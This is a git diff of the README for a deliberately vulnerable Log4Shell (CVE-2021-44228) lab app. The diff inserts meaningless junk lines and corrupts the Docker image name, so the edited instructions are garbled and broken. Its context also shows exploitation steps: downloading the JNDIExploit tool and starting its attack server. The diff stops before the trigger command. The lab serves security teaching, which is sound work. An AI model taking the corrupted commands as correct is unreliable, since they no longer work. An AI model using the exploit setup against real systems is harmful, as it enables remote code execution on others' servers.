@@ -4,16 +4,16 @@ This repository contains a Spring Boot web application vulnerable to CVE-2021-44
 
 It uses Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and the JDK 1.8.0_181.
 
-![](./screenshot.png)
+![](./screenshot.png)aef
 
 ## Running the application
-
+asdf
 Run it:
-
+afwef
 ```bash
-docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
+docker run --name vulnerable-app --rm -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-aaweapp@sha256:6f88430688108e512f7405ac3c73d47f5c370780b94182854ea2cddc6bd59929
 ```
-
+aefawefawefasasa
 ## Exploitation steps
 
 *Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*
@@ -28,7 +28,7 @@ wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploi
 unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
-
+awef
 * Then, trigger the exploit using:
 
 ```bash
